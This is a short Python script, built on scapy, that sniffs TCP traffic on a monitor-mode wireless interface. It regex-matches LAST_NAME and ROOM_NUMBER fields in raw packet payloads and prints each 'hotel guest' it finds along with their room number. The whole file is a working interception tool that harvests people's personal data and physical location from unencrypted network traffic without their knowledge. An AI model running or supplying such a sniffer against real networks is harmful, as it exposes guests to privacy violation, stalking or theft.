#!/usr/bin/python3
from scapy.all import *

def findGuest(pkt):
    raw = pkt.sprintf("%Raw,load%")
    name = re.findall("(?i)LAST_NAME=(.*)&",raw)
    room=re.findall("(?i)ROOM_NUMBER=(.*)'",raw)
    if name:
        print("[+] FOund Hotel Guest:- {} stay in Room {}".format(str(name[0]),str(room[0])))


if __name__ == "__main__":
    conf.iface = "wlan1mon"
    try:
        print("[*] Starting Hotel Guest Sniffer.")
        sniff(prn = findGuest,filter = "tcp",store=0)
    except KeyboardInterrupt:
        exit(0)